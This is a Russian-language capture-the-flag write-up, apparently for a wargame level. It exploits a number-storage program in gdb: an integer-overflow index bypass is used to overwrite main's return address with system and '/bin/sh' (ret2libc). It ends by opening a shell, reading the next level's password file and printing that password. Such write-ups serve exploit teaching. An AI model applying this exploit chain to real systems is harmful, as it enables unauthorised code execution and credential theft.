@@ -1,0 +1,104 @@
+В зависимости от запроса пользователя программа выполняет следующие команды:
+- store (запрашивается number, затем index и происходит сохранение числа по заданному индексу)
+- read (считывает и выводит число согласно индексу)
+- quit (выход из программы)
+
+Установим брейкпоинт сразу после функции store_number:
+(gdb) b *0x080488ef
+
+Input command: store
+ Number: 43690 (0xaaaa)
+ Index: 1
+
+После функции store_number стек выглядит следующим образом:
+(gdb) x/100xw $esp
+0xffffd530:     0xffffd554      0x00000014      0xf7fcfac0      0xf7fdc714
+0xffffd540:     0x00000098      0xffffffff      0xffffd80c      0xffffd7b8
+0xffffd550:     0x00000000      0x00000000      0x0000aaaa      0x00000000
+0xffffd560:     0x00000000      0x00000000      0x00000000      0x00000000
+
+Таким образом, можем выяснить куда записывается введенное пользователем число 0xffffd558
+
+Input command: store
+Number: 48059
+Index: 2
+
+(gdb) x/100xw $esp
+0xffffd530:     0xffffd554      0x00000014      0xf7fcfac0      0xf7fdc714
+0xffffd540:     0x00000098      0xffffffff      0xffffd80c      0xffffd7b8
+0xffffd550:     0x00000000      0x00000000      0x0000aaaa      0x0000bbbb
+
+Так как программа проверяет и защищает стек от перезаписи:
+
+0x080489e5 <+706>:   call   0x80484b0 <__stack_chk_fail@plt>
+
+Будем использовать перезапись адреса возврата main и чтобы определить адрес установим брейкпоинт:
+(gdb)  b *0x080489ea
+
+Дойдя до брейкпоинта (quit) узнаем адрес - 0xffffd71c, который перезапишем.
+
+Указатель на вершину стека
+(gdb) i r
+...
+esp            0xffffd70c       0xffffd70c
+
+Таким образом можно перейти на необходимую нам функцию (system), перезаписав адрес возврата
+
+0x080489f0 <+717>:   pop    %ebp
+=> 0x080489f1 <+718>:   ret
+End of assembler dump.
+(gdb) x/10xw $esp
+0xffffd71c:     0xf7e6aed0      0x00000002      0xf7f897ec      0xffffd7c0
+0xffffd72c:     0xf7fd3000      0x0000000
+0      0xffffd71c      0xffffd7c0
+
+(gdb) p 0xffffd71c - 0xffffd558
+$8 = 452
+(gdb) p 452/4
+$9 = 113
+
+Значит, необходимо перезаписать со 114 индекса.
+Но есть проблема, что программа проверяет и не допускает запись по индексам кратным 3. Поэтому можем воспользоваться переполнением int. 
+
+(gdb) p 2147483648+114
+$10 = 2147483762
+
+Можно убедиться, что действительно перезаписали нужное место в памяти:
+
+Input command: store
+Number: 7
+Index: 2147483762
+
+(gdb) x 0xffffd71c
+0xffffd71c:     0x00000007
+
+Найдем адрес функции system:
+(gdb) p system
+$11 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+
+(gdb) find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+
+Числа, которые будем подавать store:
+system - 0xf7e6aed0 - 4159090384
+/bin/sh - 0xf7f897ec - 4160264172
+
+Индексы:
+2147483648+114 = 2147483762
+
+Input command: store
+ Number: 4159090384
+ Index: 2147483762
+ Completed store command successfully
+Input command: store
+ Number: 4160264172
+ Index: 2147483764
+ Completed store command successfully
+Input command: quit
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+
+
+
+
